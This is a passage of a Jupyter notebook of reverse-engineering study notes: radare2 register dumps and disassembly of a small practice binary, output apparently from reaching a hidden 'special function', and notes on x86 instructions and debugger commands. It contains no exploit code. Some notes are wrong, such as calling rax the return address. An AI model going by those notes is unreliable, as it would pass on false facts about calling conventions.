      "r15 = 0x00000000\n",
      "rsi = 0x6767676767676767\n",
      "rdi = 0x7f60d3f56680\n",
      "rsp = 0x7ffd7c2f3910\n",
      "rbp = 0x7ffd7c2f3940\n",
      "\u001b[36mrip = 0x004005d1\u001b[0m\n",
      "rflags = 0x00000206\n",
      "orax = 0xffffffffffffffff\n",
      "\u001b[33m[0x004005d1]>\u001b[0m \u001b[?1001r\u001b[?1000l\n"
     ]
    }
   ],
   "source": [
    "%r dr"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "68b83c62-a875-4917-a925-f46836892f00",
   "metadata": {},
   "source": [
    "# Step Through Program:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "id": "5972b6d3-f7ae-4008-b2be-037e4627557e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "            \u001b[31m\u001b[31m; CODE XREF from entry.init0 @ \u001b[31m0x400565\u001b[31m\u001b[0m\n",
      "\u001b[36m┌\u001b[0m 55: \u001b[31msym.register_tm_clones\u001b[0m ();\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x004004f0\u001b[0m      \u001b[37mbe\u001b[33m38\u001b[37m10\u001b[33m60\u001b[32m00\u001b[0m     \u001b[37mmovl\u001b[36m $\u001b[36mloc._end\u001b[0m,\u001b[36m\u001b[36m \u001b[0m%\u001b[36mesi\u001b[0m\u001b[0m\u001b[31m        ; obj.__TMC_END\n",
      "\u001b[36m│\u001b[0m           \u001b[31m                                                           ; 0x601038\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x004004f5\u001b[0m      \u001b[33m55\u001b[0m             \u001b[35mpushq\u001b[36m \u001b[0m%\u001b[36mrbp\u001b[0m\u001b[0m\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x004004f6\u001b[0m      \u001b[33m48\u001b[37m81\u001b[37mee\u001b[33m38\u001b[37m10\u001b[33m60\u001b[37m.\u001b[0m  \u001b[33msubq\u001b[36m $\u001b[36mloc._end\u001b[0m,\u001b[36m\u001b[36m \u001b[0m%\u001b[36mrsi\u001b[0m\u001b[0m\u001b[31m        ; obj.__TMC_END\n",
      "\u001b[36m│\u001b[0m           \u001b[31m                                                           ; 0x601038\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x004004fd\u001b[0m      \u001b[33m48\u001b[37m89\u001b[37me5\u001b[0m         \u001b[37mmovq\u001b[36m \u001b[0m%\u001b[36mrsp\u001b[0m,\u001b[36m\u001b[36m \u001b[0m%\u001b[36mrbp\u001b[0m\u001b[0m\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[36m;-- rdx:\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x00400500\u001b[0m      \u001b[33m48\u001b[37mc1\u001b[37mfe\u001b[37m03\u001b[0m       \u001b[36msarq\u001b[36m $3\u001b[0m,\u001b[36m\u001b[36m \u001b[0m%\u001b[36mrsi\u001b[0m\u001b[0m\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x00400504\u001b[0m      \u001b[33m48\u001b[37m89\u001b[37mf0\u001b[0m         \u001b[37mmovq\u001b[36m \u001b[0m%\u001b[36mrsi\u001b[0m,\u001b[36m\u001b[36m \u001b[0m%\u001b[36mrax\u001b[0m\u001b[0m\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x00400507\u001b[0m      \u001b[33m48\u001b[37mc1\u001b[37me8\u001b[33m3f\u001b[0m       \u001b[36mshrq\u001b[36m $\u001b[33m0x3f\u001b[0m,\u001b[36m\u001b[36m \u001b[0m%\u001b[36mrax\u001b[0m\u001b[0m\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x0040050b\u001b[0m      \u001b[33m48\u001b[37m01\u001b[37mc6\u001b[0m         \u001b[33maddq\u001b[36m \u001b[0m%\u001b[36mrax\u001b[0m,\u001b[36m\u001b[36m \u001b[0m%\u001b[36mrsi\u001b[0m\u001b[0m\u001b[0m\n",
      "\u001b[36m│\u001b[0m           \u001b[32m0x0040050e\u001b[0m      \u001b[33m48\u001b[37md1\u001b[37mfe\u001b[0m         \u001b[36msarq\u001b[36m $1\u001b[0m,\u001b[36m\u001b[36m \u001b[0m%\u001b[36mrsi\u001b[0m\u001b[0m\u001b[0m\n",
      "\u001b[36m│\u001b[0m       \u001b[36m┌\u001b[0m\u001b[36m─\u001b[0m\u001b[36m<\u001b[0m \u001b[32m0x00400511\u001b[0m      \u001b[33m74\u001b[37m15\u001b[0m           \u001b[32mje 0x400528\u001b[0m\u001b[0m\n",
      "\u001b[36m│\u001b[0m       \u001b[36m│\u001b[0m   \u001b[32m0x00400513\u001b[0m      \u001b[37mb8\u001b[32m00\u001b[32m00\u001b[32m00\u001b[32m00\u001b[0m     \u001b[37mmovl\u001b[36m $0\u001b[0m,\u001b[36m\u001b[36m \u001b[0m%\u001b[36meax\u001b[0m\u001b[0m\u001b[0m\n",
      "\u001b[36m│\u001b[0m       \u001b[36m│\u001b[0m   \u001b[32m0x00400518\u001b[0m      \u001b[33m48\u001b[37m85\u001b[37mc0\u001b[0m         \u001b[36mtestq\u001b[36m \u001b[0m%\u001b[36mrax\u001b[0m,\u001b[36m\u001b[36m \u001b[0m%\u001b[36mrax\u001b[0m\u001b[0m\u001b[0m\n",
      "\u001b[36m│\u001b[0m      \u001b[36m┌\u001b[0m\u001b[36m─\u001b[0m\u001b[36m─\u001b[0m\u001b[36m<\u001b[0m \u001b[32m0x0040051b\u001b[0m      \u001b[33m74\u001b[37m0b\u001b[0m           \u001b[32mje 0x400528\u001b[0m\u001b[0m\n",
      "\u001b[36m│\u001b[0m      \u001b[36m│\u001b[0m\u001b[36m│\u001b[0m   \u001b[32m0x0040051d\u001b[0m      \u001b[33m5d\u001b[0m             \u001b[1;95mpopq\u001b[36m \u001b[0m%\u001b[36mrbp\u001b[0m\u001b[0m\u001b[0m\n",
      "\u001b[36m│\u001b[0m      \u001b[36m│\u001b[0m\u001b[36m│\u001b[0m   \u001b[32m0x0040051e\u001b[0m      \u001b[37mbf\u001b[33m38\u001b[37m10\u001b[33m60\u001b[32m00\u001b[0m     \u001b[37mmovl\u001b[36m $\u001b[36mloc._end\u001b[0m,\u001b[36m\u001b[36m \u001b[0m%\u001b[36medi\u001b[0m\u001b[0m\u001b[31m        ; obj.__TMC_END\n",
      "\u001b[36m│\u001b[0m      \u001b[36m│\u001b[0m\u001b[36m│\u001b[0m   \u001b[31m                                                           ; 0x601038\u001b[0m\n",
      "\u001b[36m│\u001b[0m      \u001b[36m│\u001b[0m\u001b[36m│\u001b[0m   \u001b[32m0x00400523\u001b[0m      \u001b[31mff\u001b[37me0\u001b[0m           \u001b[32mjmpq *%rax\u001b[0m\u001b[0m\n",
      "..\n",
      "\u001b[36m│\u001b[0m      \u001b[36m└\u001b[0m\u001b[36m└\u001b[0m\u001b[36m─\u001b[0m\u001b[36m>\u001b[0m \u001b[32m0x00400528\u001b[0m      \u001b[33m5d\u001b[0m             \u001b[1;95mpopq\u001b[36m \u001b[0m%\u001b[36mrbp\u001b[0m\u001b[0m\u001b[0m\n",
      "\u001b[36m└\u001b[0m           \u001b[32m0x00400529\u001b[0m      \u001b[37mc3\u001b[0m             \u001b[31mretq\u001b[0m\u001b[0m\u001b[0m\n",
      "\u001b[33m[0x00400500]>\u001b[0m \u001b[?1001r\u001b[?1000l\n"
     ]
    }
   ],
   "source": [
    "%r ds; pdf;"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 205,
   "id": "eee84632-f491-46f4-bf42-907a516bdb01",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "dc\n",
      "this is the special functionK\n",
      "you did this, friend!\n",
      "\u001b[33m[0x7f5ba8cb3659]>\u001b[0m \u001b[?1001r\u001b[?1000l\n"
     ]
    }
   ],
   "source": [
    "%r dc"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f3023222-2118-4205-86f8-afcc105ce332",
   "metadata": {
    "tags": []
   },
   "source": [
    "# Other Notes:"
   ]
  },
  {
   "cell_type": "raw",
   "id": "a873794a-6d25-4d69-8569-c9602d010a07",
   "metadata": {},
   "source": [
    "%rsp is the stack pointer \n",
    "%rbp is a frame pointer\n",
    "\n",
    "movq $3 rax      would move the constant 3 to the register\n",
    "movq %rax %rbx   which involves moving value from rax to rbx\n",
    "movq %rax (%rbx) which means move value stored in %rax to memory location represented by %rbx"
   ]
  },
  {
   "cell_type": "raw",
   "id": "7ba49c37-0fda-45da-9f05-e01828f00828",
   "metadata": {},
   "source": [
    "(Rb, Ri) = MemoryLocation[Rb + Ri]\n",
    "D(Rb, Ri) = MemoryLocation[Rb + Ri + D]\n",
    "(Rb, Ri, S) = MemoryLocation(Rb + S * Ri]\n",
    "D(Rb, Ri, S) = MemoryLocation[Rb + S * Ri + D]"
   ]
  },
  {
   "cell_type": "raw",
   "id": "85e2f95d-22ca-4663-bee1-9003bf7460ee",
   "metadata": {},
   "source": [
    "leaq source, destination: this instruction sets destination to the address denoted by the expression in source\n",
    "addq source, destination: destination = destination + source\n",
    "subq source, destination: destination = destination - source\n",
    "imulq source, destination: destination = destination * source\n",
    "salq source, destination: destination = destination << sourc where << is the left bit shifting operator\n",
    "sarq source, destination: destination = destination >> source where >> is the right bit shifting operator\n",
    "xorq source, destination: destination = destination XOR source\n",
    "andq source, destination: destination = destination & source\n",
    "orq source, destination: destination = destination | source"
   ]
  },
  {
   "cell_type": "raw",
   "id": "e38c3297-523f-4d77-ae78-c4a4c715e379",
   "metadata": {},
   "source": [
    "aa;e asm.syntax=att; afl; pdf @main;\n",
    "\n",
    "disassemble next instructions\n",
    "    pd \n",
    "    \n",
    "seek to location\n",
    "    s \n",
    "    \n",
    "quickly show current function\n",
    "    pdf \n",
    "\n",
    "get value stored at reference:\n",
    "    pxr @0x561f728459bf\n",
    "    \n",
    "show all registers:\n",
    "    drt all\n",
    "    \n",
    "Stack telescoping: (depends on architecture)\n",
    "    pxr @ esp\n",
    "    pxr @ rsp\n",
    "    pxa @ rsp - to show annotated hexdump\n",
    "    pxw @ rsp - to show hexadecimal words dump (32bit)\n",
    "    pxq @ rsp - to show hexadecimal quad-words dump (64bit)\n",
    "    ad@r:SP - to analyze the stack data\n",
    "    \n",
    "frame pointer(rbp) to point to the start of the new frame. \n",
    "\n",
    "Upto 6 arguments for functions can be stored in the following registers:\n",
    "\n",
    "rdi\n",
    "\n",
    "rsi\n",
    "\n",
    "rdx\n",
    "\n",
    "rcx\n",
    "\n",
    "r8\n",
    "\n",
    "r9\n",
    "\n",
    "\n",
    "rax is return address\n",
    "\n",
    "A NOP instruction is represented using \\x90"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
